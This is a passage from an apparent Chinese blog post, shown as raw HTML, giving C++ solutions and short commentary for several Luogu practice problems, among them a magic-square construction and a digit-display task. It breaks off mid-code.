class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100005</span>;</span><br><span class="line"><span class="type">int</span> a[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line">cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">n += <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> l, r;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">&#123;</span><br><span class="line">cin &gt;&gt; l &gt;&gt; r;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = l; j &lt;= r; j++)</span><br><span class="line">a[j] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> count=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (a[i] == <span class="number">0</span>)</span><br><span class="line">count++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; count ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="P5728-【深基5-例5】旗鼓相当的对手"><a href="#P5728-【深基5-例5】旗鼓相当的对手" class="headerlink" title="P5728 【深基5.例5】旗鼓相当的对手"></a>P5728 【深基5.例5】旗鼓相当的对手</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240429182951046.png" alt="image-20240429182951046"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1005</span>;</span><br><span class="line"><span class="type">int</span> a[N][<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n, count = <span class="number">0</span>;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line">cin &gt;&gt; a[i][<span class="number">0</span>] &gt;&gt; a[i][<span class="number">1</span>] &gt;&gt; a[i][<span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = i<span class="number">+1</span>; j &lt; n; j++)<span class="comment">//注意+1，不然比较的是自己，会多n次</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">abs</span>(a[i][<span class="number">0</span>] - a[j][<span class="number">0</span>]) &lt;= <span class="number">5</span> &amp;&amp; <span class="built_in">abs</span>(a[i][<span class="number">1</span>] - a[j][<span class="number">1</span>]) &lt;= <span class="number">5</span> &amp;&amp;</span><br><span class="line"><span class="built_in">abs</span>(a[i][<span class="number">2</span>] - a[j][<span class="number">2</span>]) &lt;= <span class="number">5</span> &amp;&amp; <span class="built_in">abs</span>(a[i][<span class="number">0</span>] + a[i][<span class="number">1</span>] + a[i][<span class="number">2</span>] - a[j][<span class="number">0</span>] - a[j][<span class="number">1</span>] - a[j][<span class="number">2</span>]) &lt;= <span class="number">10</span>)<span class="comment">//绝对值小于</span></span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; count;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="P5729-【深基5-例7】工艺品制作"><a href="#P5729-【深基5-例7】工艺品制作" class="headerlink" title="P5729 【深基5.例7】工艺品制作"></a>P5729 【深基5.例7】工艺品制作</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240429195454137.png" alt="image-20240429195454137"></p><p>这题要注意x，y，z的范围。这里我采用边挖方块边计算的方法，可以省下一次三重循环遍历数组：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">25</span>;</span><br><span class="line"><span class="type">int</span> a[N][N][N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> w, x, h;</span><br><span class="line">cin &gt;&gt; w &gt;&gt; x &gt;&gt; h;</span><br><span class="line"><span class="type">int</span> q;</span><br><span class="line">cin &gt;&gt; q;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> x1, y1, z1;</span><br><span class="line"><span class="type">int</span> x2, y2, z2;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; q; i++)</span><br><span class="line">&#123;</span><br><span class="line">cin &gt;&gt; x1 &gt;&gt; y1 &gt;&gt; z1;</span><br><span class="line">cin &gt;&gt; x2 &gt;&gt; y2 &gt;&gt; z2;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = x1; j &lt;= x2; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> k = y1; k &lt;= y2; k++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> l = z1; l &lt;= z2; l++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (a[j][k][l] == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">count++;</span><br><span class="line">a[j][k][l] = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">若两坐标点的位置大小不确定，还需要</span></span><br><span class="line"><span class="comment">for (int j = min(x1,x2); j &lt;= max(x1,x2); j++)</span></span><br><span class="line"><span class="comment">for (int k = min(y1,y2); k &lt;= max(y1,y2); k++)</span></span><br><span class="line"><span class="comment">for (int l = min(z1,z2); l &lt;= (z1,z2); l++)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">cout &lt;&lt; w*x*h-count;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="P2550-AHOI2001-彩票摇奖"><a href="#P2550-AHOI2001-彩票摇奖" class="headerlink" title="P2550 [AHOI2001] 彩票摇奖"></a>P2550 [AHOI2001] 彩票摇奖</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240429202113371.png" alt="image-20240429202113371"></p><p>我们可以将能数组中中奖的号码的数字在数组的位置设置为1，这样只需要对每个彩票号码取数组下标即可判断是否中奖。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">35</span>;</span><br><span class="line"><span class="type">int</span> a[N];</span><br><span class="line"><span class="type">int</span> b[<span class="number">10</span>];<span class="comment">//中奖次数数组</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">7</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> tmp;</span><br><span class="line">cin &gt;&gt; tmp;</span><br><span class="line">a[tmp] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> tmp;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">7</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">cin &gt;&gt; tmp;</span><br><span class="line"><span class="keyword">if</span> (a[tmp] == <span class="number">1</span>)</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line">b[count]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">7</span>; i &gt;=<span class="number">1</span> ; i--)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; b[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="P2615-NOIP2015-提高组-神奇的幻方"><a href="#P2615-NOIP2015-提高组-神奇的幻方" class="headerlink" title="P2615 [NOIP2015 提高组] 神奇的幻方"></a>P2615 [NOIP2015 提高组] 神奇的幻方</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240429221324882.png" alt="image-20240429221324882"></p><p>做的有点麻，经典行列分不清，然后还自作聪明把条件合并。下次要细心，把行列分清QwQ。这题的话，看题写判断就OK了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">45</span>;</span><br><span class="line"><span class="type">int</span> a[N][N];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> raw = <span class="number">1</span>, col = n/<span class="number">2</span> + <span class="number">1</span>;<span class="comment">//表示k-1数字的位置,初始化为1的位置·</span></span><br><span class="line">a[raw][col] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;=  n*n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (raw == <span class="number">1</span> &amp;&amp; col != n )</span><br><span class="line">&#123;</span><br><span class="line">raw = n ;</span><br><span class="line">col = col + <span class="number">1</span>;</span><br><span class="line">a[raw][col] = i;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (raw != <span class="number">1</span> &amp;&amp; col==n )</span><br><span class="line">&#123;</span><br><span class="line">raw = raw - <span class="number">1</span>;</span><br><span class="line">col = <span class="number">1</span>;</span><br><span class="line">a[raw][col] = i;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(raw == <span class="number">1</span> &amp;&amp; col == n)</span><br><span class="line">&#123;</span><br><span class="line">raw = raw + <span class="number">1</span>;</span><br><span class="line">col = col ;</span><br><span class="line">a[raw][col] = i;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (a[raw - <span class="number">1</span>][col + <span class="number">1</span>] == <span class="number">0</span>)<span class="comment">//右上</span></span><br><span class="line">&#123;</span><br><span class="line">raw = raw - <span class="number">1</span>;</span><br><span class="line">col = col + <span class="number">1</span>;</span><br><span class="line">a[raw][col] = i;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">raw = raw + <span class="number">1</span>;</span><br><span class="line">col = col ;</span><br><span class="line">a[raw][col] = i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; a[i][j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在题解中，有一种新的方案<a href="https://www.luogu.com.cn/article/bq0p9fs5">题解 P2615 【神奇的幻方】 - 洛谷专栏 (luogu.com.cn)</a>，可以总结一下<code>从第一行中点开始，把每一个下面的数放到“右上角”，若右上角有数，则放到正下方。</code>当i=2时，1的右上方为2（取余），当i=3时 ,2的右上方为3（取余）,当i=4时，3的右上方已经被1占用，因此放入下方。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8</span> <span class="number">1</span> <span class="number">6</span></span><br><span class="line"><span class="number">3</span> <span class="number">5</span> <span class="number">7</span></span><br><span class="line"><span class="number">4</span> <span class="number">9</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">45</span>;</span><br><span class="line"><span class="type">int</span> a[N][N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="type">int</span> raw = <span class="number">1</span>, col = n/<span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;=  n*n; i++)</span><br><span class="line">&#123;</span><br><span class="line">a[raw][col] = i;</span><br><span class="line"><span class="keyword">if</span> (a[(raw - <span class="number">2</span> + n) % n + <span class="number">1</span>][col % n + <span class="number">1</span>] == <span class="number">0</span>)<span class="comment">//要避免数组下标取0</span></span><br><span class="line">raw = (raw - <span class="number">2</span> + n) % n + <span class="number">1</span>, col = col % n + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">raw = raw % n + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; a[i][j] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="P5730-【深基5-例10】显示屏"><a href="#P5730-【深基5-例10】显示屏" class="headerlink" title="P5730 【深基5.例10】显示屏"></a>P5730 【深基5.例10】显示屏</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240514193936527.png" alt="image-20240514193936527"></p><p>打表仙人（bushi），我们每四列输出一个字母，先把<code>.</code>所在下标赋值，最后为未初始化的下标赋<code>X</code>，对于最后一列不能有<code>.</code>的问题，我们直接不输出即可：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1035</span>;</span><br><span class="line"><span class="type">char</span> a[<span class="number">5</span>][N];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="type">int</span> col = <span class="number">0</span>;<span class="comment">//表示该数字开始的列</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> tmp;</span><br><span class="line">cin &gt;&gt; tmp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tmp == <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">a[<span class="number">1</span>][col + <span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">2</span>][col + <span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">3</span>][col + <span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>,</span><br><span class="line">a[<span class="number">0</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">1</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">2</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">3</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">4</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (tmp == <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">a[<span class="number">0</span>][col] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">1</span>][col] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">2</span>][col] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">3</span>][col] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">4</span>][col] = <span class="string">&#x27;.&#x27;</span>,</span><br><span class="line">a[<span class="number">0</span>][col + <span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">1</span>][col + <span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">2</span>][col + <span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">3</span>][col + <span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">4</span>][col + <span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>,</span><br><span class="line">a[<span class="number">0</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">1</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">2</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">3</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">4</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (tmp == <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">a[<span class="number">1</span>][col] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">1</span>][col + <span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">3</span>][col + <span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">3</span>][col + <span class="number">2</span>] = <span class="string">&#x27;.&#x27;</span>,</span><br><span class="line">a[<span class="number">0</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">1</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">2</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">3</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">4</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (tmp == <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">a[<span class="number">1</span>][col] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">1</span>][col + <span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">3</span>][col] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">3</span>][col + <span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>,</span><br><span class="line">a[<span class="number">0</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">1</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">2</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">3</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">4</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (tmp == <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">a[<span class="number">3</span>][col] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">3</span>][col + <span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">4</span>][col] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">4</span>][col + <span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">0</span>][col<span class="number">+1</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">1</span>][col + <span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>,</span><br><span class="line">a[<span class="number">0</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span class="number">1</span>][col + <span class="number">3</span>] = <span class="string">&#x27;.&#x27;</span>, a[<span 